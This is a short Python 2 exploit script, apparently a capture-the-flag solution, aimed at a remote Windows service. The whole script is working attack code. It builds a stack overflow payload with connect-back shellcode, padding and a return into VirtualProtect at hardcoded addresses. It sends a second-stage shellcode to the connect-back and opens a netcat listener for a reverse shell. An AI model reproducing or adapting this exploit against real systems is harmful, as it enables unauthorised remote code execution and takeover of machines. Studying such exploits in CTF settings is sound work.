# who needs pwntools anyways.
import socket

def lol(dword):
        a=(dword>>0)&0xFF
        b=(dword>>8)&0xFF
        c=(dword>>16)&0xFF
        d=(dword>>24)&0xFF
        return chr(a)+chr(b)+chr(c)+chr(d)

remote ='hotbox.420blaze.in'

shellcode=0x0012F524
virtualprotect=0x77e41fe3

payload=''

#shellcode
payload+=open('connectback.bin','rb').read()
payload+='A'*(0xc8-len(payload)) # pad

payload+=lol(virtualprotect) # return to virtualprotect, STDCALl with ebp stack
payload+=lol(shellcode) # return to shellcode
# payload+=lol(0x13c000) # address
payload+=lol(0x12c000) # address
payload+=lol(0x4000) # dwsize
payload+=lol(0x40) # page_execute_readwrite
payload+=lol(0x0041901E) # lpflOldProtect some random address in .data idgaf about

if len(payload)>0x140:
    assert(False)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((remote, 42069))
s.sendall(payload)
print s.recv(4).encode('hex')
s.close()
print 'stage1 done'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 8721))
s.listen(1)
conn, addr = s.accept()
print 'received connectback from', addr
payload2=open('shell3.bin','rb').read()
conn.sendall(payload2)
conn.close()
print 'stage2 done'

import os # who needs pwntools anyways
os.system('nc -lvp 4444')
